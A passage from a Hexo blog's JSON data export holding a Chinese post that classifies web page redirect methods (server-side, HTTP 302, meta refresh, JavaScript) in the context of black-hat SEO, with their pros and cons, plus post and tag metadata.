href=\"#客户端劫持与服务端判断方法\" class=\"headerlink\" title=\"客户端劫持与服务端判断方法\"></a>客户端劫持与服务端判断方法</h4><p>客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。<br>服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。</p>\n<p>结语：<em>网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。</em></p>\n"},{"title":"黑帽SEO之页面跳转","date":"2016-10-10T02:48:33.000Z","comments":1,"_content":"\n　　想要更深入地了解黑帽SEO，就必须先了解关于网站的一些基础知识，以及黑帽SEO常见的作弊手法。（可以参考：[黑帽SEO--基础知识](http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/)）其中页面跳转便是作弊手法之一，最近我收集了一些关于*页面跳转*的相关内容，在此汇总分享。\n<!--more-->\n### 页面跳转分类\n#### （一）服务端跳转\n　一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。\n#### （二）客户端跳转\n客户端跳转分为：http层跳转，应用层跳转。    \n应用层跳转分为：html head跳转，js跳转等。\n\n##### http层跳转\n　http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。\n##### html head跳转（HTML refresh）\n在html代码的head中添加特殊标签，如下\n```bash\n<meta http-equiv=\"refresh\" content=\"5\"; url=\"http://thief.one/\" />\n```\n表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。\n\n##### js跳转\n通过在html代码中添加js代码，通过js代码实现跳转：\n```bash\n<script language=\"javascript\" type=\"text/javascript\">\nwindow.location.href=\"http://thief.one\";\n</script>\n```\n这个跳转应该比html head跳转更向后延迟。\n\n#### 各种跳转包含关系\n* 服务端跳转\n* 客户端跳转\n\t* http跳转\n\t* 应用层跳转\n\t\t* html head跳转\n\t\t* html js跳转\n\n<hr>\n### 各种跳转介绍\n#### （一）服务端跳转\n介绍：跳转发生在服务器上，用户不会有任何感觉。\n优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。\n缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。\n#### （二）http跳转\n介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。\n优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。\n缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。\n#### （三）html head跳转\n介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。\n优点：跳转方式灵活，可以指定延时跳转等等\n缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。\n#### （四） js跳转\n介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到\n优点：跳转方式灵活，可以指定延时跳转等等\n缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。\n\n\n参考文章：[http://www.iigrowing.cn/](http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html)  \n欢迎留言交流补充!\n\n\n\n\n","source":"_posts/黑帽SEO之页面跳转.md","raw":"---\ntitle: 黑帽SEO之页面跳转\ndate: 2016-10-10 10:48:33\ncomments: true\ntags: 黑帽SEO\ncategories: 技术交流\n---\n\n　　想要更深入地了解黑帽SEO，就必须先了解关于网站的一些基础知识，以及黑帽SEO常见的作弊手法。（可以参考：[黑帽SEO--基础知识](http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/)）其中页面跳转便是作弊手法之一，最近我收集了一些关于*页面跳转*的相关内容，在此汇总分享。\n<!--more-->\n### 页面跳转分类\n#### （一）服务端跳转\n　一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。\n#### （二）客户端跳转\n客户端跳转分为：http层跳转，应用层跳转。    \n应用层跳转分为：html head跳转，js跳转等。\n\n##### http层跳转\n　http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。\n##### html head跳转（HTML refresh）\n在html代码的head中添加特殊标签，如下\n```bash\n<meta http-equiv=\"refresh\" content=\"5\"; url=\"http://thief.one/\" />\n```\n表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。\n\n##### js跳转\n通过在html代码中添加js代码，通过js代码实现跳转：\n```bash\n<script language=\"javascript\" type=\"text/javascript\">\nwindow.location.href=\"http://thief.one\";\n</script>\n```\n这个跳转应该比html head跳转更向后延迟。\n\n#### 各种跳转包含关系\n* 服务端跳转\n* 客户端跳转\n\t* http跳转\n\t* 应用层跳转\n\t\t* html head跳转\n\t\t* html js跳转\n\n<hr>\n### 各种跳转介绍\n#### （一）服务端跳转\n介绍：跳转发生在服务器上，用户不会有任何感觉。\n优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。\n缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。\n#### （二）http跳转\n介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。\n优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。\n缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。\n#### （三）html head跳转\n介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。\n优点：跳转方式灵活，可以指定延时跳转等等\n缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。\n#### （四） js跳转\n介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到\n优点：跳转方式灵活，可以指定延时跳转等等\n缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。\n\n\n参考文章：[http://www.iigrowing.cn/](http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html)  \n欢迎留言交流补充!\n\n\n\n\n","slug":"黑帽SEO之页面跳转","published":1,"updated":"2017-02-14T01:12:03.340Z","layout":"post","photos":[],"link":"","_id":"ciz80dycc00213ofvemsgt1ba","content":"<p>　　想要更深入地了解黑帽SEO，就必须先了解关于网站的一些基础知识，以及黑帽SEO常见的作弊手法。（可以参考：<a href=\"http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/\">黑帽SEO–基础知识</a>）其中页面跳转便是作弊手法之一，最近我收集了一些关于<em>页面跳转</em>的相关内容，在此汇总分享。<br><a id=\"more\"></a></p>\n<h3 id=\"页面跳转分类\"><a href=\"#页面跳转分类\" class=\"headerlink\" title=\"页面跳转分类\"></a>页面跳转分类</h3><h4 id=\"（一）服务端跳转\"><a href=\"#（一）服务端跳转\" class=\"headerlink\" title=\"（一）服务端跳转\"></a>（一）服务端跳转</h4><p>　一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。</p>\n<h4 id=\"（二）客户端跳转\"><a href=\"#（二）客户端跳转\" class=\"headerlink\" title=\"（二）客户端跳转\"></a>（二）客户端跳转</h4><p>客户端跳转分为：http层跳转，应用层跳转。<br>应用层跳转分为：html head跳转，js跳转等。</p>\n<h5 id=\"http层跳转\"><a href=\"#http层跳转\" class=\"headerlink\" title=\"http层跳转\"></a>http层跳转</h5><p>　http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。</p>\n<h5 id=\"html-head跳转（HTML-refresh）\"><a href=\"#html-head跳转（HTML-refresh）\" class=\"headerlink\" title=\"html head跳转（HTML refresh）\"></a>html head跳转（HTML refresh）</h5><p>在html代码的head中添加特殊标签，如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"refresh\"</span> content=<span class=\"string\">\"5\"</span>; url=<span class=\"string\">\"http://thief.one/\"</span> /&gt;</div></pre></td></tr></table></figure></p>\n<p>表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。</p>\n<h5 id=\"js跳转\"><a href=\"#js跳转\" class=\"headerlink\" title=\"js跳转\"></a>js跳转</h5><p>通过在html代码中添加js代码，通过js代码实现跳转：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script language=<span class=\"string\">\"javascript\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</div><div class=\"line\">window.location.href=<span class=\"string\">\"http://thief.one\"</span>;</div><div class=\"line\">&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>这个跳转应该比html head跳转更向后延迟。</p>\n<h4 id=\"各种跳转包含关系\"><a href=\"#各种跳转包含关系\" class=\"headerlink\" title=\"各种跳转包含关系\"></a>各种跳转包含关系</h4><ul>\n<li>服务端跳转</li>\n<li>客户端跳转<ul>\n<li>http跳转</li>\n<li>应用层跳转<ul>\n<li>html head跳转</li>\n<li>html js跳转</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><hr></p>\n<h3 id=\"各种跳转介绍\"><a href=\"#各种跳转介绍\" class=\"headerlink\" title=\"各种跳转介绍\"></a>各种跳转介绍</h3><h4 id=\"（一）服务端跳转-1\"><a href=\"#（一）服务端跳转-1\" class=\"headerlink\" title=\"（一）服务端跳转\"></a>（一）服务端跳转</h4><p>介绍：跳转发生在服务器上，用户不会有任何感觉。<br>优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。<br>缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。</p>\n<h4 id=\"（二）http跳转\"><a href=\"#（二）http跳转\" class=\"headerlink\" title=\"（二）http跳转\"></a>（二）http跳转</h4><p>介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。<br>优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。<br>缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。</p>\n<h4 id=\"（三）html-head跳转\"><a href=\"#（三）html-head跳转\" class=\"headerlink\" title=\"（三）html head跳转\"></a>（三）html head跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>\n<h4 id=\"（四）-js跳转\"><a href=\"#（四）-js跳转\" class=\"headerlink\" title=\"（四） js跳转\"></a>（四） js跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>\n<p>参考文章：<a href=\"http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html\" target=\"_blank\" rel=\"external\">http://www.iigrowing.cn/</a><br>欢迎留言交流补充!</p>\n","excerpt":"<p>　　想要更深入地了解黑帽SEO，就必须先了解关于网站的一些基础知识，以及黑帽SEO常见的作弊手法。（可以参考：<a href=\"http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/\">黑帽SEO–基础知识</a>）其中页面跳转便是作弊手法之一，最近我收集了一些关于<em>页面跳转</em>的相关内容，在此汇总分享。<br>","more":"</p>\n<h3 id=\"页面跳转分类\"><a href=\"#页面跳转分类\" class=\"headerlink\" title=\"页面跳转分类\"></a>页面跳转分类</h3><h4 id=\"（一）服务端跳转\"><a href=\"#（一）服务端跳转\" class=\"headerlink\" title=\"（一）服务端跳转\"></a>（一）服务端跳转</h4><p>　一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。</p>\n<h4 id=\"（二）客户端跳转\"><a href=\"#（二）客户端跳转\" class=\"headerlink\" title=\"（二）客户端跳转\"></a>（二）客户端跳转</h4><p>客户端跳转分为：http层跳转，应用层跳转。<br>应用层跳转分为：html head跳转，js跳转等。</p>\n<h5 id=\"http层跳转\"><a href=\"#http层跳转\" class=\"headerlink\" title=\"http层跳转\"></a>http层跳转</h5><p>　http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。</p>\n<h5 id=\"html-head跳转（HTML-refresh）\"><a href=\"#html-head跳转（HTML-refresh）\" class=\"headerlink\" title=\"html head跳转（HTML refresh）\"></a>html head跳转（HTML refresh）</h5><p>在html代码的head中添加特殊标签，如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"refresh\"</span> content=<span class=\"string\">\"5\"</span>; url=<span class=\"string\">\"http://thief.one/\"</span> /&gt;</div></pre></td></tr></table></figure></p>\n<p>表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。</p>\n<h5 id=\"js跳转\"><a href=\"#js跳转\" class=\"headerlink\" title=\"js跳转\"></a>js跳转</h5><p>通过在html代码中添加js代码，通过js代码实现跳转：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script language=<span class=\"string\">\"javascript\"</span> <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</div><div class=\"line\">window.location.href=<span class=\"string\">\"http://thief.one\"</span>;</div><div class=\"line\">&lt;/script&gt;</div></pre></td></tr></table></figure></p>\n<p>这个跳转应该比html head跳转更向后延迟。</p>\n<h4 id=\"各种跳转包含关系\"><a href=\"#各种跳转包含关系\" class=\"headerlink\" title=\"各种跳转包含关系\"></a>各种跳转包含关系</h4><ul>\n<li>服务端跳转</li>\n<li>客户端跳转<ul>\n<li>http跳转</li>\n<li>应用层跳转<ul>\n<li>html head跳转</li>\n<li>html js跳转</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><hr></p>\n<h3 id=\"各种跳转介绍\"><a href=\"#各种跳转介绍\" class=\"headerlink\" title=\"各种跳转介绍\"></a>各种跳转介绍</h3><h4 id=\"（一）服务端跳转-1\"><a href=\"#（一）服务端跳转-1\" class=\"headerlink\" title=\"（一）服务端跳转\"></a>（一）服务端跳转</h4><p>介绍：跳转发生在服务器上，用户不会有任何感觉。<br>优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。<br>缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。</p>\n<h4 id=\"（二）http跳转\"><a href=\"#（二）http跳转\" class=\"headerlink\" title=\"（二）http跳转\"></a>（二）http跳转</h4><p>介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。<br>优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。<br>缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。</p>\n<h4 id=\"（三）html-head跳转\"><a href=\"#（三）html-head跳转\" class=\"headerlink\" title=\"（三）html head跳转\"></a>（三）html head跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>\n<h4 id=\"（四）-js跳转\"><a href=\"#（四）-js跳转\" class=\"headerlink\" title=\"（四） js跳转\"></a>（四） js跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>\n<p>参考文章：<a href=\"http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html\">http://www.iigrowing.cn/</a><br>欢迎留言交流补充!</p>"}],"PostAsset":[],"PostCategory":[{"post_id":"ciz80dy9z00003ofvjr288ce7","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dyav000d3ofvnrftybah"},{"post_id":"ciz80dyat000c3ofvk1ymy97o","category_id":"ciz80dyaq00093ofvy3cmupwf","_id":"ciz80dyb1000j3ofvef2oeq2y"},{"post_id":"ciz80dya900023ofvgiqx8ztw","category_id":"ciz80dyaq00093ofvy3cmupwf","_id":"ciz80dyb5000n3ofvjkl4c9jx"},{"post_id":"ciz80dyak00063ofvm5mul5cq","category_id":"ciz80dyaq00093ofvy3cmupwf","_id":"ciz80dyba000r3ofvihqvxta6"},{"post_id":"ciz80dyb2000k3ofvlden1s2o","category_id":"ciz80dyaq00093ofvy3cmupwf","_id":"ciz80dybd000w3ofvf0lzy15q"},{"post_id":"ciz80dyb5000o3ofvxssmz900","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dybf000z3ofvsr98k334"},{"post_id":"ciz80dyam00073ofv4tq1s38i","category_id":"ciz80dyaq00093ofvy3cmupwf","_id":"ciz80dybi00133ofvlxuzm1rs"},{"post_id":"ciz80dyao00083ofvd7k57bni","category_id":"ciz80dyaq00093ofvy3cmupwf","_id":"ciz80dybk00163ofvof8m626m"},{"post_id":"ciz80dybf000y3ofvmvicv0s1","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dybn001a3ofv2nkkjfp7"},{"post_id":"ciz80dybh00123ofvtwbxqwrt","category_id":"ciz80dybg00103ofvk5q5cxks","_id":"ciz80dybq001d3ofviqn7mlcb"},{"post_id":"ciz80dyaw000e3ofvkpxhmwwg","category_id":"ciz80dybg00103ofvk5q5cxks","_id":"ciz80dybs001h3ofvglq6kvyn"},{"post_id":"ciz80dybj00153ofv9cj0v25g","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dybw001k3ofvk9xivxag"},{"post_id":"ciz80dybm00193ofvor86nhr0","category_id":"ciz80dybg00103ofvk5q5cxks","_id":"ciz80dyc2001o3ofvl9onhl2y"},{"post_id":"ciz80dyaz000h3ofv9x2rn4y5","category_id":"ciz80dybg00103ofvk5q5cxks","_id":"ciz80dyc4001r3ofv71gc554q"},{"post_id":"ciz80dybo001c3ofv55e662hf","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dyc6001t3ofviewo6pwy"},{"post_id":"ciz80dybr001g3ofvhdrpq6qe","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dyc9001x3ofvbhbxfvug"},{"post_id":"ciz80dyb7000q3ofv84nmkyuz","category_id":"ciz80dybg00103ofvk5q5cxks","_id":"ciz80dycb001z3ofvi7kwgb77"},{"post_id":"ciz80dybv001j3ofvbw76an8v","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dycd00223ofvgsv8x2ud"},{"post_id":"ciz80dyc1001n3ofv540nzrs7","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dyce00243ofvpegvzjg5"},{"post_id":"ciz80dybb000v3ofvwsnhd3s3","category_id":"ciz80dybg00103ofvk5q5cxks","_id":"ciz80dycf00263ofvha0movze"},{"post_id":"ciz80dyc3001q3ofvnsqbxkt6","category_id":"ciz80dyaq00093ofvy3cmupwf","_id":"ciz80dycf00283ofv6hg8rkoz"},{"post_id":"ciz80dyc4001s3ofvex0v36oy","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dycg002a3ofv5gtx8zi9"},{"post_id":"ciz80dyc8001w3ofvpsz5vpyx","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dycg002c3ofv9q4s5h8m"},{"post_id":"ciz80dyca001y3ofvm6j3ay5g","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dycg002d3ofvt0efqovt"},{"post_id":"ciz80dycc00213ofvemsgt1ba","category_id":"ciz80dyae00043ofv2ovllpzj","_id":"ciz80dych002g3ofv65f1ckc2"}],"PostTag":[{"post_id":"ciz80dy9z00003ofvjr288ce7","tag_id":"ciz80dyai00053ofvxivw7uy4","_id":"ciz80dyas000b3ofv545f2c2f"},{"post_id":"ciz80dya900023ofvgiqx8ztw","tag_id":"ciz80dyar000a3ofvkjomo7f0","_id":"ciz80dyb0000i3ofvykl0llua"},{"post_id":"ciz80dyak00063ofvm5mul5cq","tag_id":"ciz80dyax000g3ofvvduojgza","_id":"ciz80dyb7000p3ofvg71xihf4"},{"post_id":"ciz80dyb2000k3ofvlden1s2o","tag_id":"ciz80dyax000g3ofvvduojgza","_id":"ciz80dyba000t3ofvw83e56rz"},{"post_id":"ciz80dyam00073ofv4tq1s38i","tag_id":"ciz80dyax000g3ofvvduojgza","_id":"ciz80dybe000x3ofvdh0hr5je"},{"post_id":"ciz80dyao00083ofvd7k57bni","tag_id":"ciz80dyax000g3ofvvduojgza","_id":"ciz80dybi00143ofv1piks1so"},{"post_id":"ciz80dyat000c3ofvk1ymy97o","tag_id":"ciz80dyax000g3ofvvduojgza","_id":"ciz80dybn001b3ofv68r8uakp"},{"post_id":"ciz80dyaw000e3ofvkpxhmwwg","tag_id":"ciz80dybl00183ofvgkee065z","_id":"ciz80dybu001i3ofvetbwrfqk"},{"post_id":"ciz80dyaz000h3ofv9x2rn4y5","tag_id":"ciz80dybl00183ofvgkee065z","_id":"ciz80dyc2001p3ofvg76xayba"},{"post_id":"ciz80dyb5000o3ofvxssmz900","tag_id":"ciz80dyc1001m3ofv9mee56h9","_id":"ciz80dyc8001v3ofv24mv4du3"},{"post_id":"ciz80dyb7000q3ofv84nmkyuz","tag_id":"ciz80dyc7001u3ofvmu4767bz","_id":"ciz80dycd00233ofv27y69rx1"},{"post_id":"ciz80dybb000v3ofvwsnhd3s3","tag_id":"ciz80dycc00203ofv5o7eyzvh","_id":"ciz80dycf00273ofvt78r2vi9"},{"post_id":"ciz80dybf000y3ofvmvicv0s1","tag_id":"ciz80dyce00253ofvx6z9pcjf","_id":"ciz80dycg002b3ofvnweatb5c"},{"post_id":"ciz80dybh00123ofvtwbxqwrt","tag_id":"ciz80dycf00293ofvbjtj2o3z","_id":"ciz80dych002f3ofvb0dzjpp2"},{"post_id":"ciz80dybj00153ofv9cj0v25g","tag_id":"ciz80dych002e3ofvtxiag45y","_id":"ciz80dyck002i3ofvp4ucbpbg"},{"post_id":"ciz80dybm00193ofvor86nhr0","tag_id":"ciz80dycj002h3ofvrvrtfk7m","_id":"ciz80dycm002k3ofvxy8bqptj"},{"post_id":"ciz80dybo001c3ofv55e662hf","tag_id":"ciz80dycm002j3ofvjcxfq5bv","_id":"ciz80dyco002m3ofvn5o96q3l"},{"post_id":"ciz80dybr001g3ofvhdrpq6qe","tag_id":"ciz80dycn002l3ofv2oudg3ez","_id":"ciz80dycq002o3ofvi0us2y7i"},{"post_id":"ciz80dybv001j3ofvbw76an8v","tag_id":"ciz80dych002e3ofvtxiag45y","_id":"ciz80dycs002q3ofvo777ysas"},{"post_id":"ciz80dyc1001n3ofv540nzrs7","tag_id":"ciz80dycr002p3ofvidln0z9j","_id":"ciz80dyct002s3ofvtffxsu4l"},{"post_id":"ciz80dyc3001q3ofvnsqbxkt6","tag_id":"ciz80dycs002r3ofv6fiw1qto","_id":"ciz80dycu002u3ofvgih6dtbh"},{"post_id":"ciz80dyc4001s3ofvex0v36oy","tag_id":"ciz80dyct002t3ofvfr38g1st","_id":"ciz80dycu002w3ofvfadcyzzq"},{"post_id":"ciz80dyc8001w3ofvpsz5vpyx","tag_id":"ciz80dyct002t3ofvfr38g1st","_id":"ciz80dycw002y3ofv6430zl5o"},{"post_id":"ciz80dyca001y3ofvm6j3ay5g","tag_id":"ciz80dyct002t3ofvfr38g1st","_id":"ciz80dycx00303ofvu1zyszcr"},{"post_id":"ciz80dycc00213ofvemsgt1ba","tag_id":"ciz80dyct002t3ofvfr38g1st","_id":"ciz80dycz00313ofvcj4t60by"}],"Tag":[{"name":"系统安全","_id":"ciz80dyai00053ofvxivw7uy4"},{"name":"Gooey","_id":"ciz80dyar000a3ofvkjomo7f0"},{"name":"Multiprocessing","_id":"ciz80dyax000g3ofvvduojgza"},{"name":"木马后门","_id":"ciz80dybl00183ofvgkee065z"},{"name":"加密算法","_id":"ciz80dyc1001m3ofv9mee56h9"},{"name":"扫描器","_id":"ciz80dyc7001u3ofvmu4767bz"},{"name":"wireshark","_id":"ciz80dycc00203ofv5o7eyzvh"},{"name":"rethinkdb","_id":"ciz80dyce00253ofvx6z9pcjf"},{"name":"信息收集工具","_id":"ciz80dycf00293ofvbjtj2o3z"},{"name":"Web应用漏洞","_id":"ciz80dych002e3ofvtxiag45y"},{"name":"python运维脚本","_id":"ciz80dycj002h3ofvrvrtfk7m"},{"name":"kali","_id":"ciz80dycm002j3ofvjcxfq5bv"},{"name":"系统服务","_id":"ciz80dycn002l3ofv2oudg3ez"},{"name":"黑苹果","_id":"ciz80dycr002p3ofvidln0z9j"},{"name":"python编码问题","_id":"ciz80dycs002r3ofv6fiw1qto"},{"name":"黑帽SEO","_id":"ciz80dyct002t3ofvfr38g1st"}]}}